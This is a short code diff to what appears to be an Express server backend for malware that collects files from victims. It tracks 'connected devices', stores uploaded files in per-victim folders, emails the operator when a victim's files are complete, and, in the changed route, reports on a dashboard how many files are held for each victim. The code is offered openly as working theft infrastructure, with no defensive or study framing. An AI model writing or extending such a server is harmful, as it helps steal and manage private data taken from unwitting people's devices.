@@ -62,6 +62,7 @@ async function checkAndSendEmail(victimId, victimFolder) {
   if (filesInFolder.length === victimTotalFiles[victimId]) {
     console.log(`✅ All files received for victim ${victimId}`);
 
+    // Store the file details (name, size, type) for the victim
     const files = filesInFolder.map((filename) => {
       const filePath = path.join(victimFolder, filename);
       const stats = fs.statSync(filePath);
@@ -157,7 +158,18 @@ app.post('/upload', (req, res) => {
 
 // Route to provide dashboard data
 app.get('/dashboard-data', (req, res) => {
-  res.json(connectedDevices);
+  // Count the number of files stored for each victim
+  const dashboardData = Object.entries(connectedDevices).map(([victimId, device]) => {
+    const victimFolder = victimFolders[victimId];
+    const totalFilesStored = victimFolder ? fs.readdirSync(victimFolder).length : 0;  // Count files in folder
+
+    return {
+      ...device,
+      totalFiles: totalFilesStored, // Include the total number of files stored
+    };
+  });
+
+  res.json(dashboardData);
 });
 
 // Route to download files
